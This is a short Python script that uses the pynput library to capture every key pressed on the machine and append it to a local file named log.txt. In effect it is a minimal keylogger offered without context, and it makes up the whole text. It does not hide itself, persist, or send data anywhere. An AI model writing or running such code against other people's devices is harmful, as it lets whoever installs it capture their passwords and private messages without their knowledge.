from pynput.keyboard import Listener

def WriteAFile(input):
    Data = str(input)
    Data = Data.replace ("'","")
    with open("log.txt","a") as f:
        f.write(Data)

with Listener(on_press = WriteAFile) as l:
    l.join()